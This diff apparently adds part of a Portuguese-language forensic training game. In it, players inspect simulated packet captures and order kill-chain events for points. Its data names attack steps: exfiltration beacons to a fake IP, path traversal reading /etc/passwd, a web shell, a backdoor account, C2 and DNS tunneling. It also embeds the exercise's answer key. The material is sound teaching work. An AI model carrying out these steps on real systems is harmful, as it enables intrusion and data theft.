+  { num: 13, time: '03:23:22.001', src: '192.168.10.7',  dst: '10.20.45.113',   proto: 'HTTP',  len:  312, info: 'POST /exfil.php HTTP/1.1 — intervalo: 300s',     cls: 'pkt-anomalous', discovery: 'et4-c2-beacon',     detail: '⚠ Segundo beacon: intervalo exatamente 300s — C2 automatizado' },
+  { num: 14, time: '03:28:22.001', src: '192.168.10.7',  dst: '10.20.45.113',   proto: 'HTTP',  len:  312, info: 'POST /exfil.php HTTP/1.1 — intervalo: 300s',     cls: 'pkt-anomalous', discovery: 'et4-c2-beacon',     detail: '⚠ IP destino: 10.20.45.113 — mesmo IP do scanner da Etapa 1' },
+  { num: 15, time: '03:33:22.001', src: '192.168.10.7',  dst: '10.20.45.113',   proto: 'HTTP',  len:  312, info: 'POST /exfil.php HTTP/1.1 — intervalo: 300s',     cls: 'pkt-anomalous', discovery: 'et4-ip-correlate',  detail: '⚠ Correlação confirmada: 10.20.45.113 = scanner (Etapa 1) = exfiltrador (Etapa 4)' },
+];
+
+function buildEt4() {
+  const wrap = document.getElementById('et4-wrap');
+  const rowsHTML = PACKETS.map((p, i) => {
+    const protoCls = { DNS: 'proto-dns', HTTP: 'proto-http', HTTPS: 'proto-https', TCP: 'proto-tcp' }[p.proto] || '';
+    return `<tr class="pkt-row ${p.cls}" data-idx="${i}">
+      <td>${p.num}</td>
+      <td>${p.time}</td>
+      <td>${p.src}</td>
+      <td>${p.dst}</td>
+      <td class="${protoCls}">${p.proto}</td>
+      <td>${p.len}</td>
+      <td class="pkt-info">${p.info}</td>
+    </tr>
+    <tr class="pkt-detail-row"><td colspan="7" class="pkt-detail-cell">${p.detail || '— Tráfego normal'}</td></tr>`;
+  }).join('');
+
+  wrap.innerHTML = `
+  <div class="etapa-card" id="et4-card">
+    <div class="etapa-hdr">
+      <div class="etapa-num" id="et4-num">4</div>
+      <div><div class="etapa-tag">Etapa 4</div><div class="etapa-title">Exfiltração</div></div>
+      <div class="etapa-score" id="et4-score">0 / 200 pts</div>
+    </div>
+    <div class="etapa-body">
+      <div class="main-col">
+        <div class="sub-label">Captura de Tráfego — 192.168.10.7</div>
+        <div class="pkt-toolbar">
+          <button class="pkt-filter-btn active" data-filter="all">Todos</button>
+          <button class="pkt-filter-btn" data-filter="DNS">DNS</button>
+          <button class="pkt-filter-btn" data-filter="HTTP">HTTP</button>
+          <button class="pkt-filter-btn" data-filter="HTTPS">HTTPS</button>
+          <button class="pkt-filter-btn" data-filter="10.20.45.113">10.20.45.113</button>
+        </div>
+        <div class="pkt-table-wrap">
+          <table class="pkt-table">
+            <thead><tr><th>#</th><th>Tempo</th><th>Origem</th><th>Destino</th><th>Proto</th><th>Len</th><th>Info</th></tr></thead>
+            <tbody id="et4-tbody">${rowsHTML}</tbody>
+          </table>
+        </div>
+        <p class="log-hint">↑ Clique em um pacote para ver detalhes e marcar como descoberta</p>
+      </div>
+      <div class="checklist-col">
+        <div class="chk-header">Descobertas — Etapa 4</div>
+        <div class="checklist">
+          <div class="chk-item" id="chk-et4-dns-exfil"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">DNS tunneling com dados encoded identificado</div><div class="chk-pts">+50 pts</div></div></div>
+          <div class="chk-item" id="chk-et4-volume-exfil"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Transferência de volume anômalo (10MB+)</div><div class="chk-pts">+50 pts</div></div></div>
+          <div class="chk-item" id="chk-et4-c2-beacon"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Beacon C2 (POST /exfil.php, 300s) detectado</div><div class="chk-pts">+50 pts</div></div></div>
+          <div class="chk-item" id="chk-et4-ip-correlate"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">IP 10.20.45.113 correlacionado entre etapas</div><div class="chk-pts">+50 pts</div></div></div>
+        </div>
+      </div>
+    </div>
+  </div>`;
+
+  revealSection(wrap);
+
+  const tbody = document.getElementById('et4-tbody');
+  const DISC_LABELS = {
+    'et4-dns-exfil':    ['🌐 Descoberta!', 'DNS tunneling com Base64 identificado'],
+    'et4-volume-exfil': ['📦 Descoberta!', 'Exfiltração de 10.2MB para IP externo'],
+    'et4-c2-beacon':    ['📡 Descoberta!', 'Beacon C2 a cada 300s detectado'],
+    'et4-ip-correlate': ['🔗 Descoberta!', 'IP 10.20.45.113 correlacionado: Etapa 1 → Etapa 4'],
+  };
+
+  tbody.querySelectorAll('.pkt-row').forEach(row => {
+    row.addEventListener('click', function () {
+      const wasOpen = this.classList.contains('open');
+      tbody.querySelectorAll('.pkt-row').forEach(r => r.classList.remove('open', 'selected'));
+      if (!wasOpen) {
+        this.classList.add('open', 'selected');
+        const pkt = PACKETS[parseInt(this.dataset.idx)];
+        if (pkt.discovery && DISC_LABELS[pkt.discovery]) {
+          const [lbl, msg] = DISC_LABELS[pkt.discovery];
+          award('et4', pkt.discovery, 50, lbl, msg);
+        }
+      }
+    });
+  });
+
+  // Filter
+  wrap.querySelectorAll('.pkt-filter-btn').forEach(btn => {
+    btn.addEventListener('click', function () {
+      wrap.querySelectorAll('.pkt-filter-btn').forEach(b => b.classList.remove('active'));
+      this.classList.add('active');
+      const f = this.dataset.filter;
+      let visIdx = 0;
+      tbody.querySelectorAll('.pkt-row').forEach(row => {
+        const pkt = PACKETS[parseInt(row.dataset.idx)];
+        const hide = f !== 'all' && pkt.proto !== f && pkt.src !== f && pkt.dst !== f;
+        row.style.display = hide ? 'none' : '';
+        const det = row.nextElementSibling;
+        if (det) det.style.display = hide ? 'none' : '';
+        if (!hide) row.cells[0].textContent = ++visIdx;
+      });
+    });
+  });
+}
+
+/* ═══════════════════════════════════════════════════════ */
+/* TIMELINE — Drag & Drop Kill Chain                      */
+/* ═══════════════════════════════════════════════════════ */
+const TL_CARDS = [
+  { id: 0, text: 'Scanner web identifica vulnerabilidade em /search', icon: '🔍', phase: 'Reconhecimento',  phaseCls: 'phase-recon' },
+  { id: 1, text: 'Path traversal tenta ler /etc/passwd',              icon: '📂', phase: 'Reconhecimento',  phaseCls: 'phase-recon' },
+  { id: 2, text: 'Web shell carregado em /var/www/html/',             icon: '🐚', phase: 'Acesso Inicial',  phaseCls: 'phase-access' },
+  { id: 3, text: 'Brute force SSH bem-sucedido (root)',               icon: '🔑', phase: 'Acesso Inicial',  phaseCls: 'phase-access' },
+  { id: 4, text: 'Conta backdoor svc_helper criada',                  icon: '👤', phase: 'Persistência',    phaseCls: 'phase-persist' },
+  { id: 5, text: 'Conta adicionada ao grupo Administrators',          icon: '⬆️', phase: 'Persistência',    phaseCls: 'phase-persist' },
+  { id: 6, text: 'Beacon C2 iniciado para update-cdn185.net',         icon: '📡', phase: 'C2',              phaseCls: 'phase-c2' },
+  { id: 7, text: 'Exfiltração de dados via DNS tunneling',            icon: '📤', phase: 'Exfiltração',     phaseCls: 'phase-exfil' },
+];
+const TL_CORRECT_ORDER = [0, 1, 2, 3, 4, 5, 6, 7];
+const TL_INITIAL_SHUFFLE = [3, 0, 7, 5, 1, 4, 6, 2];
+
+let tlOrder = [...TL_INITIAL_SHUFFLE]; // array of card IDs in current order
+let tlConfirmed = false;
+let dragSrcId = null;
+
+function buildTimeline() {
+  const wrap = document.getElementById('tl-wrap');
+  wrap.innerHTML = `
+  <div class="tl-card" id="tl-card">
+    <div class="tl-hdr">
+      <span class="tl-hdr-icon">⏱️</span>
+      <span class="tl-hdr-title">Kill Chain — Reconstituição Cronológica</span>
+      <span class="tl-hdr-pts">200 pts</span>
+    </div>
+    <div class="tl-body">
+      <p class="tl-instructions">
+        <strong>Arraste os eventos</strong> para ordená-los cronologicamente — do primeiro ao último.<br>
+        Ordem correta = <strong>+200 pts</strong> · 1–2 erros = +100 pts · 3+ erros = +0 pts
+      </p>
+      <div class="tl-list" id="tl-list"></div>
+      <div class="tl-actions">
+        <button class="btn-confirm-tl" id="tl-confirm-btn" type="button">Confirmar Timeline</button>
+        <button class="btn-shuffle" id="tl-shuffle-btn" type="button">↺ Embaralhar</button>
+      </div>
+      <div class="tl-result" id="tl-result" style="display:none"></div>
+    </div>
+  </div>`;
+
+  revealSection(wrap);
+  renderTlList();
+
+  document.getElementById('tl-confirm-btn').addEventListener('click', confirmTimeline);
+  document.getElementById('tl-shuffle-btn').addEventListener('click', () => {
+    if (tlConfirmed) return;
+    tlOrder = [...TL_INITIAL_SHUFFLE].sort(() => Math.random() - .5);
+    renderTlList();
+  });
+}
+
+function renderTlList() {
+  const list = document.getElementById('tl-list');
+  if (!list) return;
+  list.innerHTML = '';
+  tlOrder.forEach((cardId, pos) => {
+    const c = TL_CARDS[cardId];
+    const el = document.createElement('div');
+    el.className = 'tl-item';
+    el.draggable = true;
+    el.dataset.id = cardId;
+    el.innerHTML = `
+      <span class="tl-drag-handle">⋮⋮</span>
+      <div class="tl-pos">${pos + 1}</div>
+      <span class="tl-icon">${c.icon}</span>
+      <span class="tl-text">${c.text}</span>
+      <span class="tl-phase ${c.phaseCls}">${c.phase}</span>`;
+
+    el.addEventListener('dragstart', e => {
+      dragSrcId = cardId;
+      el.classList.add('dragging');
+      e.dataTransfer.effectAllowed = 'move';
+    });
+    el.addEventListener('dragend', () => {
+      el.classList.remove('dragging');
+      document.querySelectorAll('.tl-item').forEach(i => i.classList.remove('drag-over-top', 'drag-over-bot'));
+    });
+    el.addEventListener('dragover', e => {
+      e.preventDefault();
+      if (dragSrcId === cardId) return;
+      document.querySelectorAll('.tl-item').forEach(i => i.classList.remove('drag-over-top', 'drag-over-bot'));
+      const rect = el.getBoundingClientRect();
+      const midY = rect.top + rect.height / 2;
+      el.classList.add(e.clientY < midY ? 'drag-over-top' : 'drag-over-bot');
+    });
+    el.addEventListener('drop', e => {
+      e.preventDefault();
+      if (dragSrcId === null || dragSrcId === cardId) return;
+      const srcPos = tlOrder.indexOf(dragSrcId);
+      const dstPos = tlOrder.indexOf(cardId);
+      const rect   = el.getBoundingClientRect();
+      const after  = e.clientY >= rect.top + rect.height / 2;
+      tlOrder.splice(srcPos, 1);
+      const insertAt = tlOrder.indexOf(cardId) + (after ? 1 : 0);
+      tlOrder.splice(insertAt, 0, dragSrcId);
+      dragSrcId = null;
+      renderTlList();
+    });
+
+    list.appendChild(el);
+  });
+}
+
+function confirmTimeline() {
+  if (tlConfirmed) return;
+  tlConfirmed = true;
+
+  let errors = 0;
+  TL_CORRECT_ORDER.forEach((correctId, pos) => {
+    if (tlOrder[pos] !== correctId) errors++;
+  });
+
+  let pts, variant, title, body;
+  if (errors === 0) {
+    pts = 200; variant = 'ok';
+    title = '✅ Kill Chain Perfeita! +200 pts';
+    body  = 'Você ordenou corretamente todos os 8 eventos da kill chain. Excelente análise!';
+  } else if (errors <= 2) {
+    pts = 100; variant = 'par';
+    title = '⚠️ Quase Lá! +100 pts — ' + errors + ' erro(s)';
+    body  = 'Veja a ordem correta abaixo em verde.';
+  } else {
+    pts = 0; variant = 'err';
+    title = '❌ +0 pts — ' + errors + ' erro(s)';
+    body  = 'Revise a narrativa da kill chain no fechamento.';
+  }
+
+  score.tl = pts;
+  done.tl = true;
+  updateHUD();
+
+  if (pts > 0) showToast('⏱️ Kill Chain!', pts, title.split('+')[0].trim());
+
+  // Highlight correct/wrong
+  const list = document.getElementById('tl-list');
+  list.querySelectorAll('.tl-item').forEach((el, pos) => {
+    const cardId = parseInt(el.dataset.id);
+    el.classList.add(TL_CORRECT_ORDER[pos] === cardId ? 'correct' : 'wrong');
+    el.draggable = false;
+  });
+  document.getElementById('tl-confirm-btn').disabled = true;
+  document.getElementById('tl-shuffle-btn').disabled = true;
+
+  const resultEl = document.getElementById('tl-result');
+  resultEl.className = 'tl-result ' + variant;
+  resultEl.style.display = 'block';
+  resultEl.innerHTML = `<div class="tl-result-title">${title}</div>
+    <div class="tl-result-body">${body}
+    ${errors > 0 ? '<br><br><strong style="color:var(--cyan)">Ordem correta:</strong><br>' +
+      TL_CORRECT_ORDER.map((id, i) => `${i+1}. ${TL_CARDS[id].icon} ${TL_CARDS[id].text}`).join('<br>') : ''}
+    </div>`;
+
+  setProgStep(5, 'done');
+  setTimeout(revealClosing, 2000);
+}
+
+function revealClosing() {
+  const el = document.getElementById('closing-section');
+  el.style.display = 'block';
+  el.offsetHeight;
+  el.classList.add('visible');
+  document.getElementById('lc-score').textContent = total() + ' pts';
+  setTimeout(() => el.scrollIntoView({ behavior: 'smooth', block: 'start' }), 150);
+}
+
+/* ── Init: show Etapa 1 sections ─────────────────────── */
+(function init() {
+  // Etapa 1 is always visible; reveal locked sections
+  document.querySelectorAll('.section-wrap').forEach(sw => revealSection(sw));
+})();
+
+})();
+</script>
+</body>
+</html>
